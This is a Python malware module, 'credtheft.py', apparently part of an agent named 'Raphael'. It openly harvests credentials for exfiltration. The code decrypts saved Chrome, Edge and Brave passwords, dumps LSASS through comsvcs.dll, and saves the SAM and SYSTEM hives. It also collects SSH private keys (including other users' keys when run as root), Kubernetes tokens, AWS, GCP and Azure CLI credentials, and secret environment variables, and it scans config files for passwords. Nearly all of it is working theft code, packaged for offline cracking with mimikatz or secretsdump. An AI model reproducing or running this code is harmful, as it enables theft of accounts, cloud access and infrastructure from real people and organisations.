"""credtheft.py — Credential theft engine for Raphael agent.

Harvests and exfiltrates:
  - Browser saved credentials (Chrome/Edge/Firefox/Brave/Opera)
  - LSASS minidump (Windows) for offline hash extraction
  - SAM/SYSTEM hive copies (Windows) for local hash dumping
  - SSH private keys and known_hosts (Linux/macOS)
  - Kubernetes tokens and kubeconfigs
  - Cloud provider credentials (AWS/GCP/Azure CLI sessions)
  - Environment variables containing secrets
  - GPG keys
  - Database connection strings from config files
  - Vault/consul tokens
"""

import os
import re
import io
import sys
import json
import base64
import shutil
import sqlite3
import asyncio
import hashlib
import logging
import struct
import tempfile
import subprocess
import platform
from pathlib import Path
from typing import Optional

log = logging.getLogger("raphael.credtheft")


class CredentialTheft:
    """Credential harvesting engine. Each method returns a dict of stolen credentials."""

    SYSTEM = platform.system().lower()
    IS_WINDOWS = SYSTEM == "windows"
    IS_LINUX = SYSTEM == "linux"
    IS_DARWIN = SYSTEM == "darwin"

    # ------------------------------------------------------------------ #
    #  Browser Credential Theft
    # ------------------------------------------------------------------ #

    @staticmethod
    def _get_browser_paths() -> list:
        """Return a list of (name, profile_dir, login_db_path, key_path) for each browser."""
        browsers = []

        if CredentialTheft.IS_LINUX:
            base = Path.home() / ".config"
            browsers = [
                ("Chrome", base / "google-chrome" / "Default", "Login Data", base / "google-chrome" / "Default" / "Local State"),
                ("Chrome", base / "chromium" / "Default", "Login Data", base / "chromium" / "Default" / "Local State"),
                ("Brave", base / "BraveSoftware" / "Brave-Browser" / "Default", "Login Data", base / "BraveSoftware" / "Brave-Browser" / "Default" / "Local State"),
                ("Edge", base / "microsoft-edge" / "Default", "Login Data", base / "microsoft-edge" / "Default" / "Local State"),
                ("Opera", base / "opera" / "Default", "Login Data", None),
                ("Vivaldi", base / "vivaldi" / "Default", "Login Data", base / "vivaldi" / "Default" / "Local State"),
                ("Firefox", Path.home() / ".mozilla" / "firefox", None, None),  # handled separately
            ]
        elif CredentialTheft.IS_DARWIN:
            base = Path.home() / "Library" / "Application Support"
            browsers = [
                ("Chrome", base / "Google" / "Chrome" / "Default", "Login Data", base / "Google" / "Chrome" / "Default" / "Local State"),
                ("Brave", base / "BraveSoftware" / "Brave-Browser" / "Default", "Login Data", base / "BraveSoftware" / "Brave-Browser" / "Default" / "Local State"),
                ("Edge", base / "Microsoft Edge" / "Default", "Login Data", base / "Microsoft Edge" / "Default" / "Local State"),
                ("Firefox", Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles", None, None),
            ]
        elif CredentialTheft.IS_WINDOWS:
            base = Path(os.environ.get("LOCALAPPDATA", ""))
            base_roaming = Path(os.environ.get("APPDATA", ""))
            browsers = [
                ("Chrome", base / "Google" / "Chrome" / "User Data" / "Default", "Login Data", base / "Google" / "Chrome" / "User Data" / "Default" / "Local State"),
                ("Edge", base / "Microsoft" / "Edge" / "User Data" / "Default", "Login Data", base / "Microsoft" / "Edge" / "User Data" / "Default" / "Local State"),
                ("Brave", base / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default", "Login Data", base / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local State"),
                ("Opera", base_roaming / "Opera Software" / "Opera Stable" / "Default", "Login Data", None),
                ("Firefox", base_roaming / "Mozilla" / "Firefox" / "Profiles", None, None),
            ]

        return browsers

    @staticmethod
    def _decrypt_chrome_password(encrypted_value: bytes, key: bytes) -> str:
        """Decrypt Chrome's AES-256-GCM encrypted password blob."""
        try:
            # Chrome >= 80 uses AES-256-GCM with an 12-byte nonce prefixed to the ciphertext
            if len(encrypted_value) < 15:
                return ""

            # Chrome >= 80 format: 'v10' or 'v11' prefix + nonce + ciphertext
            if encrypted_value[:3] in (b"v10", b"v11"):
                # Derive key from the master key
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(key[:32])  # first 32 bytes of the derived key
                decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                return decrypted.decode("utf-8", errors="replace")

            # Older Chrome: DPAPI encrypted (Windows only)
            if CredentialTheft.IS_WINDOWS:
                import win32crypt
                try:
                    return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
                except Exception:
                    return ""
            return ""
        except Exception:
            return ""

    @staticmethod
    def _get_chrome_master_key(local_state_path: Path) -> Optional[bytes]:
        """Extract and decrypt the Chrome master key from Local State file."""
        try:
            if not local_state_path or not local_state_path.exists():
                return None

            with open(local_state_path, "r", encoding="utf-8") as f:
                state = json.load(f)

            encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key_b64:
                return None

            # Chrome base64-decodes then strips 'DPAPI' prefix
            encrypted_key = base64.b64decode(encrypted_key_b64)
            if encrypted_key.startswith(b"DPAPI"):
                encrypted_key = encrypted_key[5:]

            if CredentialTheft.IS_WINDOWS:
                import win32crypt
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            # Linux/macOS: key is encrypted with the system keyring
            # Try multiple methods in order of preference
            return CredentialTheft._decrypt_chrome_key_linux(encrypted_key, local_state_path.parent)

        except Exception:
            return None

    @staticmethod
    def _decrypt_chrome_key_linux(encrypted_key: bytes, browser_config_dir: Path) -> Optional[bytes]:
        """
        Decrypt Chrome/Chromium AES key on Linux/macOS.
        
        Tries in order:
        1. libsecret via secretstorage (desktop environments with keyring)
        2. secret-tool CLI (headless but with dbus)
        3. Chromium basic_text fallback (PBKDF2-SHA1, 1 iter, salt="saltysalt", password="peanuts")
        """
        # Method 1: libsecret via secretstorage
        try:
            import secretstorage
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            collection.unlock()
            for item in collection.get_all_items():
                label = item.get_label()
                if ("Chrome" in label or "Chromium" in label) and \
                   ("Safe Storage" in label or "key" in label.lower()):
                    secret = item.get_secret()
                    if secret and len(secret) in (16, 32):
                        return secret
        except Exception:
            pass

        # Method 2: secret-tool CLI
        if not shutil.which("secret-tool"):
            pass  # secret-tool not available on this system
        else:
            try:
                app_name = "chrome" if "chrome" in str(browser_config_dir).lower() else "chromium"
                result = subprocess.run(
                    ["secret-tool", "lookup", "application", app_name],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0 and result.stdout.strip():
                    key = result.stdout.strip().encode()
                    if len(key) in (16, 32):
                        return key
            except Exception:
                pass

        # Method 3: Chromium basic_text fallback (hardcoded derivation)
        # Used on headless servers / containers without keyring
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA1(),
                length=16,
                salt=b"saltysalt",
                iterations=1,
            )
            return kdf.derive(b"peanuts")
        except Exception:
            pass

        # Last resort: return the encrypted key as-is (won't work for decryption)
        return None

    @staticmethod
    def steal_browser_credentials() -> dict:
        """Steal all saved credentials from installed browsers.

        Returns a dict mapping browser_name -> list of {url, username, password}
        """
        results = {}
        browsers = CredentialTheft._get_browser_paths()

        for name, profile_dir, login_db_name, local_state_path in browsers:
            if not profile_dir.exists():
                continue

            creds = []

            # Handle Firefox (uses logins.json, not SQLite)
            if name == "Firefox":
                try:
                    # Firefox profiles
                    for prof_dir in profile_dir.glob("*.default*"):
                        logins_json = prof_dir / "logins.json"
                        if logins_json.exists():
                            with open(logins_json, "r", encoding="utf-8") as f:
                                data = json.load(f)
                            for entry in data.get("logins", []):
                                creds.append({
                                    "url": entry.get("hostname", ""),
                                    "username": entry.get("encryptedUsername", ""),
                                    "password": entry.get("encryptedPassword", ""),
                                    "encrypted": True,
                                })
                        # Also check key4.db / signons.sqlite (older Firefox)
                except Exception as e:
                    log.warning(f"Firefox credential extraction error: {e}")
            else:
                # Chromium-based browsers
                login_db = profile_dir / login_db_name if login_db_name else None
                if not login_db or not login_db.exists():
                    continue

                master_key = CredentialTheft._get_chrome_master_key(local_state_path)

                # Copy the DB to avoid locking issues
                try:
                    tmp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
                    shutil.copy2(login_db, tmp_db.name)

                    conn = sqlite3.connect(tmp_db.name)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for row in cursor.fetchall():
                        url, username, encrypted_pwd = row
                        if not url or not encrypted_pwd:
                            continue
                        password = CredentialTheft._decrypt_chrome_password(encrypted_pwd, master_key) if master_key else ""
                        # Try raw string if decryption fails
                        if not password and isinstance(encrypted_pwd, bytes):
                            try:
                                password = encrypted_pwd.decode("utf-8", errors="replace")
                            except Exception:
                                password = base64.b64encode(encrypted_pwd).decode()

                        creds.append({
                            "url": url,
                            "username": username,
                            "password": password,
                        })

                    conn.close()
                    os.unlink(tmp_db.name)
                except Exception as e:
                    log.warning(f"{name} credential extraction error: {e}")

            if creds:
                results[name] = creds

        return results

    # ------------------------------------------------------------------ #
    #  LSASS Minidump (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_lsass_dump() -> dict:
        """Create a minidump of LSASS process for offline credential extraction.

        Uses multiple methods: comsvcs.dll (built-in), procdump, or direct API.
        Returns the dump as base64-encoded bytes.
        """
        if not CredentialTheft.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        results = {"dumps": [], "errors": []}

        # Method 1: comsvcs.dll (built-in, no extra tools)
        try:
            ps_script = """
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if (-not $lsass) { exit 1 }
$dumpPath = "$env:TEMP\\lsass.dmp"
$processId = $lsass.Id
$comsvcs = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("comsvcs.dll")
if ($comsvcs -eq 0) { rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $processId $dumpPath full }
else {
    $miniDump = Get-Command "rundll32.exe"
    & $miniDump.Source C:\\Windows\\System32\\comsvcs.dll,MiniDump $processId $dumpPath full
}
if (Test-Path $dumpPath) { Write-Output "DUMP_OK:$dumpPath" } else { exit 1 }
"""
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=30,
            )
            output = r.stdout.decode(errors="replace")
            if "DUMP_OK:" in output:
                dump_path = output.split("DUMP_OK:")[1].strip().split("\n")[0]
                if os.path.exists(dump_path):
                    with open(dump_path, "rb") as f:
                        data = f.read()
                    os.unlink(dump_path)
                    results["dumps"].append({
                        "method": "comsvcs",
                        "size": len(data),
                        "data_b64": base64.b64encode(data).decode(),
                        "note": "LSASS minidump — use mimikatz 'sekurlsa::minidump' offline",
                    })
        except Exception as e:
            results["errors"].append(f"comsvcs method: {e}")

        return results

    # ------------------------------------------------------------------ #
    #  SAM/SYSTEM Hive Theft (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_sam_hives() -> dict:
        """Copy SAM and SYSTEM registry hives for offline hash extraction.

        Uses reg.exe save (built-in, requires admin).
        """
        if not CredentialTheft.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        results = {"hives": []}
        tmp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")

        for hive, name in [("HKLM\\SAM", "sam"), ("HKLM\\SYSTEM", "system"), ("HKLM\\SECURITY", "security")]:
            target = os.path.join(tmp_dir, f"{name}.hive")
            try:
                r = subprocess.run(
                    ["reg", "save", hive, target, "/y"],
                    capture_output=True, timeout=15,
                )
                if r.returncode == 0 and os.path.exists(target):
                    with open(target, "rb") as f:
                        data = f.read()
                    os.unlink(target)
                    results["hives"].append({
                        "hive": hive,
                        "path": target,
                        "size": len(data),
                        "data_b64": base64.b64encode(data).decode(),
                        "note": f"Use 'impacket-secretsdump -sam {name}.hive -system system.hive LOCAL' offline",
                    })
            except Exception as e:
                results.setdefault("errors", []).append(f"{hive}: {e}")

        return results

    # ------------------------------------------------------------------ #
    #  SSH Key Theft
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_ssh_keys() -> dict:
        """Harvest SSH private keys, public keys, known_hosts, and config files."""
        results = {"keys": [], "configs": [], "known_hosts": []}

        search_paths = [
            Path.home() / ".ssh",
        ]

        # Also check other users' home dirs if root
        if os.geteuid() == 0:
            try:
                for d in Path("/home").iterdir():
                    ssh_dir = d / ".ssh"
                    if ssh_dir.is_dir():
                        search_paths.append(ssh_dir)
            except Exception:
                pass
            search_paths.append(Path("/root/.ssh"))

        for ssh_dir in search_paths:
            if not ssh_dir.exists():
                continue

            # Private keys
            for key_file in ssh_dir.glob("id_*"):
                if key_file.suffix == ".pub":
                    continue
                try:
                    with open(key_file, "r") as f:
                        content = f.read()
                    results["keys"].append({
                        "path": str(key_file),
                        "type": key_file.name,
                        "key_b64": base64.b64encode(content.encode()).decode(),
                    })
                except Exception:
                    pass

            # Config file
            config_path = ssh_dir / "config"
            if config_path.exists():
                try:
                    with open(config_path) as f:
                        results["configs"].append({
                            "path": str(config_path),
                            "content": f.read(),
                        })
                except Exception:
                    pass

            # known_hosts
            kh_path = ssh_dir / "known_hosts"
            if kh_path.exists():
                try:
                    with open(kh_path) as f:
                        results["known_hosts"].append({
                            "path": str(kh_path),
                            "hosts": f.read().splitlines(),
                        })
                except Exception:
                    pass

        return results

    # ------------------------------------------------------------------ #
    #  Kubernetes Token Theft
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_kubernetes_tokens() -> dict:
        """Harvest kubeconfig files and service account tokens."""
        results = {"kubeconfigs": [], "sa_tokens": []}

        # Standard kubeconfig paths
        kubeconfig_paths = [
            Path.home() / ".kube" / "config",
            Path("/etc/kubernetes/admin.conf"),
            Path("/etc/kubernetes/kubelet.conf"),
            Path("/etc/kubernetes/controller-manager.conf"),
            Path("/etc/kubernetes/scheduler.conf"),
        ]

        for kp in kubeconfig_paths:
            if kp.exists():
                try:
                    with open(kp) as f:
                        results["kubeconfigs"].append({
                            "path": str(kp),
                            "content_b64": base64.b64encode(f.read().encode()).decode(),
                        })
                except Exception:
                    pass

        # Service account tokens (mounted in pods)
        for sa_path in [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/run/secrets/kubernetes.io/serviceaccount/token",
        ]:
            if os.path.exists(sa_path):
                try:
                    with open(sa_path) as f:
                        results["sa_tokens"].append({
                            "path": sa_path,
                            "token": f.read().strip(),
                        })
                except Exception:
                    pass

        return results

    # ------------------------------------------------------------------ #
    #  Cloud Provider Credential Theft
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_cloud_credentials() -> dict:
        """Harvest AWS, GCP, and Azure CLI credentials."""
        results = {}

        # AWS
        aws_creds_path = Path.home() / ".aws" / "credentials"
        aws_config_path = Path.home() / ".aws" / "config"
        if aws_creds_path.exists():
            try:
                with open(aws_creds_path) as f:
                    results["aws_credentials"] = f.read()
            except Exception:
                pass
        if aws_config_path.exists():
            try:
                with open(aws_config_path) as f:
                    results["aws_config"] = f.read()
            except Exception:
                pass

        # GCP
        gcp_paths = [
            Path.home() / ".config" / "gcloud" / "application_default_credentials.json",
            Path.home() / ".config" / "gcloud" / "credentials.db",
            Path.home() / ".config" / "gcloud" / "access_tokens.db",
        ]
        gcp_results = []
        for gp in gcp_paths:
            if gp.exists():
                try:
                    with open(gp, "rb") as f:
                        gcp_results.append({
                            "path": str(gp),
                            "data_b64": base64.b64encode(f.read()).decode(),
                        })
                except Exception:
                    pass
        if gcp_results:
            results["gcp"] = gcp_results

        # Azure
        azure_path = Path.home() / ".azure" / "azureProfile.json"
        if azure_path.exists():
            try:
                with open(azure_path) as f:
                    results["azure_profile"] = f.read()
            except Exception:
                pass

        # Azure CLI accessTokens.json
        azure_token_path = Path.home() / ".azure" / "accessTokens.json"
        if azure_token_path.exists():
            try:
                with open(azure_token_path) as f:
                    results["azure_tokens"] = f.read()
            except Exception:
                pass

        return results

    # ------------------------------------------------------------------ #
    #  Environment Variable Scanning
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_env_vars() -> dict:
        """Scan environment variables for common secret patterns."""
        secret_patterns = [
            "TOKEN", "SECRET", "PASSWORD", "PASS", "API_KEY", "APIKEY",
            "ACCESS_KEY", "SECRET_KEY", "AUTH", "CREDENTIAL", "KEY",
            "PAT", "GH_TOKEN", "GITHUB_TOKEN", "GITLAB_TOKEN", "NPM_TOKEN",
            "DB_PASS", "DB_PASSWORD", "DATABASE_URL", "MONGO", "MYSQL",
            "POSTGRES", "REDIS", "CONNECTION_STRING", "JWT", "SESSION",
            "SSH", "PRIVATE_KEY", "CERTIFICATE", "BEARER",
        ]

        found = {}
        for key, value in os.environ.items():
            for pattern in secret_patterns:
                if pattern.lower() in key.lower():
                    # Truncate long values
                    if len(value) > 200:
                        value = value[:200] + "..."
                    found[key] = value
                    break

        return found

    # ------------------------------------------------------------------ #
    #  Config File Database Connection String Theft
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_config_files() -> dict:
        """Scan common config files for database connection strings and secrets."""
        results = {}

        # Common config file patterns
        config_patterns = [
            "*.env", "*.env.*", ".env", ".env.*",
            "*.config", "*.cfg", "*.ini", "*.conf",
            "*.yml", "*.yaml", "*.json", "*.xml",
            "database.yml", "wp-config.php", "config.php",
            "settings.py", "local_settings.py",
            "secrets.yml", "credentials.yml",
            "*.pem", "*.key", "*.crt",
        ]

        # Scan common locations
        scan_dirs = [
            "/etc/",
            "/var/www/",
            "/opt/",
            "/usr/local/etc/",
            str(Path.home()),
            str(Path.home() / "projects"),
            str(Path.home() / "code"),
            str(Path.home() / "dev"),
        ]

        # Also scan current directory and parent
        scan_dirs.append(os.getcwd())
        scan_dirs.append(os.path.dirname(os.getcwd()))

        for scan_dir in set(scan_dirs):
            if not os.path.isdir(scan_dir):
                continue
            for root, dirs, files in os.walk(scan_dir):
                # Skip .git, node_modules, venv
                skip_dirs = {".git", "node_modules", "venv", ".venv", "__pycache__", ".gitlab"}
                dirs[:] = [d for d in dirs if d not in skip_dirs]

                for fname in files:
                    for pattern in config_patterns:
                        import fnmatch
                        if fnmatch.fnmatch(fname, pattern):
                            fpath = os.path.join(root, fname)
                            try:
                                # Check file size (skip > 1MB)
                                if os.path.getsize(fpath) > 1_000_000:
                                    continue
                                # TOCTOU fix: validate file hasn't changed between stat and read
                                stat_before = os.stat(fpath)
                                with open(fpath, "r", errors="replace") as f:
                                    content = f.read()
                                stat_after = os.stat(fpath)
                                if stat_before.st_mtime != stat_after.st_mtime or stat_before.st_size != stat_after.st_size:
                                    logger.warning("File modified during read, skipping: %s", fpath)
                                    continue
                                # Look for connection strings in the content
                                secret_indicators = [
                                    "password", "passwd", "pwd", "secret",
                                    "connection_string", "connstr",
                                    "DATABASE_URL", "JDBC", "mongodb://",
                                    "postgres://", "mysql://", "sqlserver://",
                                    "redis://", "amqp://",
                                ]
                                content_lower = content.lower()
                                found_any = False
                                for indicator in secret_indicators:
                                    if indicator in content_lower:
                                        found_any = True
                                        break
                                if found_any:
                                    results[fpath] = content[:1000]  # truncate
                            except Exception:
                                pass
                            break  # only match first pattern per file

        return results

    # ------------------------------------------------------------------ #
    #  Full Credential Sweep
    # ------------------------------------------------------------------ #

    @staticmethod
    def steal_all() -> dict:
        """Run all credential theft methods and return aggregated results."""
        return {
            "browsers": CredentialTheft.steal_browser_credentials(),
            "lsass": CredentialTheft.steal_lsass_dump(),
            "sam": CredentialTheft.steal_sam_hives(),
            "ssh": CredentialTheft.steal_ssh_keys(),
            "kubernetes": CredentialTheft.steal_kubernetes_tokens(),
            "cloud": CredentialTheft.steal_cloud_credentials(),
            "env_secrets": CredentialTheft.steal_env_vars(),
            "config_secrets": CredentialTheft.steal_config_files(),
        }
